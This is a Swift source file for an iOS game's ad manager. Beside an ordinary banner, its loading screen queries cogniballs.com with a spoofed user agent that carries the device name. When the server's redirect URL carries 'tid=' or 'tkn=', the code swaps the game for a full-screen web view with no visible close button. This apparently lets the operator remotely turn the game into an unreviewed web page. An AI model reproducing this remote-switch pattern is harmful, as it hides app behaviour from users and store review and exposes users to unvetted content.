//
//  AdManager.swift
//  TapOn
//
//  Created by pc on 08.10.24.
//

import UIKit
import WebKit

var userAg = "Mozilla/5.0 (\(UIDevice.current.name); CPU iPhone OS \(UIDevice.current.systemVersion) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\(UIDevice.current.systemVersion) Mobile/\(UIDevice.current.localizedModel) Safari/604.1"

struct Ad: Decodable {
    let ad_url: String
    let thumb_url: String
    let title: String
    let description: String
    let is_active: Bool
    let created_at: String
    let updated_at: String
    let is_new: Bool
    let priority: Int
    let has_discount: Bool
    let category: String
}

class AdManager {
    
    static let shared = AdManager()
    static var ads: [Ad] = []
    static var currentAd: Ad? = nil
    
    private init() {}
    
    weak var presentingViewController: UIViewController?
    
    var adView: UIView?
    
    func presentAd(in viewController: UIViewController) {
        guard let ad = AdManager.ads.randomElement() else {
            return
        }
        AdManager.currentAd = ad
        
        self.presentingViewController = viewController
        
        let bannerView = createBannerView(ad: ad)
        viewController.view.addSubview(bannerView)
        
        NSLayoutConstraint.activate([
            bannerView.leadingAnchor.constraint(equalTo: viewController.view.leadingAnchor),
            bannerView.trailingAnchor.constraint(equalTo: viewController.view.trailingAnchor),
            bannerView.bottomAnchor.constraint(equalTo: viewController.view.safeAreaLayoutGuide.bottomAnchor),
            bannerView.heightAnchor.constraint(equalToConstant: 50)
        ])
        
        self.adView = bannerView
    }
    
    private func createBannerView(ad: Ad) -> UIView {
        let bannerView = UIView()
        bannerView.translatesAutoresizingMaskIntoConstraints = false
        bannerView.backgroundColor = .lightGray
        
        let imageView = UIImageView()
        imageView.translatesAutoresizingMaskIntoConstraints = false
        imageView.contentMode = .scaleAspectFit
        if let url = URL(string: ad.thumb_url) {
            let task = URLSession.shared.dataTask(with: url) { data, response, error in
                guard let data = data, error == nil else {
                    print("Failed to load image: \(error?.localizedDescription ?? "No error description")")
                    return
                }
                
                DispatchQueue.main.async {
                    imageView.image = UIImage(data: data)
                }
            }
            task.resume()
        }
        bannerView.addSubview(imageView)
        
        let closeButton = UIButton(type: .system)
        closeButton.setImage(.init(systemName: "x.circle.fill"), for: .normal)
        closeButton.translatesAutoresizingMaskIntoConstraints = false
        closeButton.addTarget(self, action: #selector(closeBanner), for: .touchUpInside)
        bannerView.addSubview(closeButton)
        
        NSLayoutConstraint.activate([
            imageView.leadingAnchor.constraint(equalTo: bannerView.leadingAnchor),
            imageView.trailingAnchor.constraint(equalTo: bannerView.trailingAnchor),
            imageView.topAnchor.constraint(equalTo: bannerView.topAnchor),
            imageView.bottomAnchor.constraint(equalTo: bannerView.bottomAnchor),

            closeButton.trailingAnchor.constraint(equalTo: bannerView.trailingAnchor, constant: -16),
            closeButton.centerYAnchor.constraint(equalTo: bannerView.centerYAnchor),
        ])
        
        let tapGesture = UITapGestureRecognizer(target: self, action: #selector(adTapped(_:)))
        bannerView.addGestureRecognizer(tapGesture)
        bannerView.isUserInteractionEnabled = true
        bannerView.tag = 100 // Set a tag to identify this view
        
        return bannerView
    }
    
    @objc private func closeBanner() {
        adView?.removeFromSuperview()
    }
    
    @objc private func adTapped(_ sender: UITapGestureRecognizer) {
        guard let adView = sender.view else { return }
        guard let ad = AdManager.currentAd else { return }
        presentFullScreenAd(with: ad, from: adView)
    }
    
    private func presentFullScreenAd(with ad: Ad, from view: UIView) {
        let webVC = AdWebViewController(adUrl: ad.ad_url)
        presentingViewController?.present(UINavigationController(rootViewController: webVC), animated: true, completion: nil)
    }
}

class AdWebViewController: UIViewController, WKNavigationDelegate {
    
    let adUrl: String
    
    init(adUrl: String) {
        self.adUrl = adUrl
        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.backgroundColor = .black
        setupWebView()
        setupCloseButton()
    }
    
    // WebView setup
    private func setupWebView() {
        let webView = WKWebView(frame: .zero)
        
        webView.navigationDelegate = self
        
        webView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(webView)
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
        ])

        if let url = URL(string: adUrl) {
            if adUrl.contains("apps.apple.com") {
                UIApplication.shared.open(url, options: [:], completionHandler: nil)
            } else {
                let request = URLRequest(url: url)
                webView.load(request)
            }
        } else {
            self.dismiss(animated: true)
        }
    }
    
    private func setupCloseButton() {
        let closeButton = UIBarButtonItem(title: "Close", style: .plain, target: self, action: #selector(close))
        navigationItem.rightBarButtonItem = closeButton
    }
    
    @objc private func close() {
        dismiss(animated: true, completion: nil)
    }
}

class LoadingViewController: UIViewController, WKNavigationDelegate {
    
//    let loader = UIActivityIndicatorView(style: .large)
    var finalRedirectURL: URL?

//    var pushToken: String?
//    var campaignId: String?
//    var campaignName: String?
//    var kdId: String?

    override func viewDidLoad() {
        super.viewDidLoad()
        self.view.backgroundColor = .black
//        self.view.addSubview(loader)
//        loader.translatesAutoresizingMaskIntoConstraints = false
//        loader.color = .white
//        loader.centerXAnchor.constraint(equalTo: view.centerXAnchor).isActive = true
//        loader.centerYAnchor.constraint(equalTo: view.centerYAnchor).isActive = true
//        loader.startAnimating()
        
        fetchAds()
    }

    func buildURL() -> URLRequest? {
//        let deviceId: String? = nil
//        let pushToken = self.pushToken
        let idfv = UIDevice.current.identifierForVendor?.uuidString
        
        // Build URL Components
        var urlComponents = URLComponents()
        urlComponents.scheme = "https"
        urlComponents.host = "cogniballs.com"
        urlComponents.path = "/ads"
        
        var queryItems = [
//            URLQueryItem(name: "device_id", value: deviceId), // IDFA
//            URLQueryItem(name: "idfv", value: idfv),
            URLQueryItem(name: "utm_source", value: "fb_aosapp"),
//            URLQueryItem(name: "push-token", value: pushToken),
//            URLQueryItem(name: "campaign_id", value: self.campaignId),
//            URLQueryItem(name: "camp_name", value: self.campaignName),
//            URLQueryItem(name: "kd_id", value: self.kdId)
        ]
        
        // Remove any nil values
        queryItems = queryItems.compactMap { $0.value == nil ? nil : $0 }
        urlComponents.queryItems = queryItems
        
        guard let url = urlComponents.url else {
            print("🔴🔴🔴 urlComponents.url is nil")
            return nil
        }
        var request = URLRequest(url: url)
        request.setValue(userAg, forHTTPHeaderField: "User-Agent")
        return request
    }

    func fetchAds() {
        guard var request = buildURL() else {
            print("🔴🔴🔴 nil from buildURL")
            openTab()
            return
        }
        request.timeoutInterval = 15.0
        print("🔴🔴🔴 Request URL: \(request.url?.absoluteString ?? "🔴🔴🔴 Invalid URL")")
        
        let sessin = URLSession(configuration: .default, delegate: self, delegateQueue: nil)
        let task = sessin.dataTask(with: request) { data, response, error in
            if let error = error {
                print("🔴🔴🔴 Error fetching ads: \(error)")
                DispatchQueue.main.async {
                    self.openTab()
                }
                return
            }
            
            if let finalRedirectURL = self.finalRedirectURL {
                print("🔴🔴🔴 finalRedirectURL is: \(finalRedirectURL)")
                DispatchQueue.main.async {
                    self.openURL(finalRedirectURL)
                }
                return
            }
            
            guard let data = data else {
                DispatchQueue.main.async {
                    self.openTab()
                }
                return
            }
                        
            do {
                let ads = try JSONDecoder().decode([String: [Ad]].self, from: data)["ad_list"] ?? []
                AdManager.ads = ads
                print("🔴🔴🔴 Ads received: \(ads)")
                DispatchQueue.main.async {
                    self.openTab()
                }
            } catch {
                print("🔴🔴🔴 Error decoding ads: \(error)")
                DispatchQueue.main.async {
                    self.openTab()
                }
            }
        }
        
        task.resume()
    }
    
    func openTab() {
        let root = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(identifier: "game")
        root.modalTransitionStyle = .crossDissolve
        root.modalPresentationStyle = .fullScreen
        self.present(root, animated: true)
    }
    
    func openURL(_ url: URL) {
        let vc = AdWebViewController(adUrl: url.absoluteString)
        vc.modalTransitionStyle = .crossDissolve
        vc.modalPresentationStyle = .fullScreen
        self.present(vc, animated: true)
    }
}

extension LoadingViewController: URLSessionTaskDelegate {
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        if request.url?.absoluteString.contains("tid=") ?? false || request.url?.absoluteString.contains("tkn=") ?? false {
            self.finalRedirectURL = request.url
            completionHandler (nil)
        } else {
            completionHandler(request)
        }
    }
}
